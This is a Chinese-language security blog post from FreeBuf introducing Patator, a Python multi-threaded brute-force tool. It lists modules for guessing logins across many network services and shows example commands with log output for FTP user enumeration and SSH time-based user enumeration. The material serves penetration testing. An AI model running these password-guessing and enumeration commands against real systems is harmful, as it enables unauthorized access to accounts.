## **0x0 背景**

 **Patator是出于对使用Hydra，Medusa，Ncrack，Metasploit模块和Nmap NSE脚本进行密码猜测攻击而感到失望后，
选择了不同的方法编写另一个暴力破解工具避免重复相同的缺点。 Patator是一个用Python编写的多线程工具，它比其他前辈更加可靠和灵活。**

 **下载地址：<https://github.com/lanjelot/patator>**  

目前它支持以下模块：  

    
    
    * ftp_login      : Brute-force FTP
    * ssh_login      : Brute-force SSH
    * telnet_login   : Brute-force Telnet
    * smtp_login     : Brute-force SMTP
    * smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
    * smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
    * finger_lookup  : Enumerate valid users using Finger
    * http_fuzz      : Brute-force HTTP/HTTPS
    * rdp_gateway    : Brute-force RDP Gateway
    * ajp_fuzz       : Brute-force AJP
    * pop_login      : Brute-force POP
    * pop_passd      : Brute-force poppassd (not POP3)
    * imap_login     : Brute-force IMAP
    * ldap_login     : Brute-force LDAP
    * smb_login      : Brute-force SMB
    * smb_lookupsid  : Brute-force SMB SID-lookup
    * rlogin_login   : Brute-force rlogin
    * vmauthd_login  : Brute-force VMware Authentication Daemon
    * mssql_login    : Brute-force MSSQL
    * oracle_login   : Brute-force Oracle
    * mysql_login    : Brute-force MySQL
    * mysql_query    : Brute-force MySQL queries
    * rdp_login      : Brute-force RDP (NLA)
    * pgsql_login    : Brute-force PostgreSQL
    * vnc_login      : Brute-force VNC
    * dns_forward    : Brute-force DNS
    * dns_reverse    : Brute-force DNS (reverse lookup subnets)
    * ike_enum       : Enumerate IKE transforms
    * snmp_login     : Brute-force SNMPv1/2 and SNMPv3
    * unzip_pass     : Brute-force the password of encrypted ZIP files
    * keystore_pass  : Brute-force the password of Java keystore files
    * sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
    * umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes

##  **0x1 使用**

### FTP:Enumerating users denied login in vsftpd/userlis  

    
    
    $ ftp_login host=10.0.0.1 user=FILE0 0=logins.txt password=asdf -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
    19:36:06 patator    INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2015-02-08 19:36 AEDT
    19:36:06 patator    INFO -    19:36:06 patator    INFO - code  size    time | candidate                          |   num | mesg
    19:36:06 patator    INFO - -----------------------------------------------------------------------------    19:36:07 patator    INFO - 230   17     0.002 | anonymous                          |     7 | Login successful.
    19:36:07 patator    INFO - 230   17     0.001 | ftp                                |    10 | Login successful.
    19:36:08 patator    INFO - 530   18     1.000 | root                               |     1 | Permission denied.
    19:36:17 patator    INFO - 530   18     1.000 | michael                            |    50 | Permission denied.
    19:36:36 patator    INFO - 530   18     1.000 | robert                             |    93 | Permission denied.
    ...

### SSH:Time-based user enumeration  

    
    
    $ ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3
    17:45:20 patator    INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2015-02-08 17:45 AEDT
    17:45:20 patator    INFO -    17:45:20 patator    INFO - code  size    time | candidate                          |   num | mesg
    17:45:20 patator    INFO - -----------------------------------------------------------------------------    17:45:30 patator    FAIL - xxx   41    10.001 | root                               |     1 | <class '__main__.TimeoutError'> timed out
    17:45:34 patator    FAIL - xxx   41    10.000 | john                               |    23 | <class '__main__.TimeoutError'> timed out
    17:45:37 patator    FAIL - xxx   41    10.000 | joe                                |    40 | <class '__main__.TimeoutError'> timed out
    ...

##  **0x2 体验**

**![1.JPG](https://image.3001.net/images/20180906/1536223841_5b90ea61139e9.jpg!small)**

**![5.JPG](https://image.3001.net/images/20180906/1536223851_5b90ea6bc9c6a.jpg!small)*本文作者：si1ence，转载请注明来自FreeBuf.COM**

